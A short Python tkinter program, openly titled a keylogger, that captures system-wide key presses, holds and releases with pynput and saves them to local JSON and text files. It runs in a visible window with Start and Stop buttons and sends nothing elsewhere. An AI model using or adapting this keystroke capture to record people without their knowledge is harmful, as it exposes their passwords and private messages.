import tkinter as tk
from pynput import keyboard
import json

key_list = []
x = False
key_strokes = ""
listener = None


def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)


def update_text_file(key):
    with open('logs.txt', 'w') as key_stroke:
        key_stroke.write(key)


def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)


def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)
    key_strokes=key_strokes+str(key)
    update_text_file(str(key_strokes))


def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the detailed information about keys in 'logs.json'"
                      "\nonly pressed key information in 'logs.txt'", font=("Arial", 10))
    start_button.config(state='disabled')
    stop_button.config(state='normal')


def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')


root = tk.Tk()
root.title("Keylogger")

label = tk.Label(root, text="Click Start to begin keylogging.", font=("Arial", 14))
label.pack(pady=20)

start_button = tk.Button(root, text="Start", width=12, command=start_keylogger)
start_button.pack(side=tk.LEFT, padx=10)

stop_button = tk.Button(root, text="Stop", width=12, command=stop_keylogger, state='disabled')
stop_button.pack(side=tk.RIGHT, padx=10)

root.geometry("350x150")  # Set the window size to 350x150 pixels

root.mainloop()
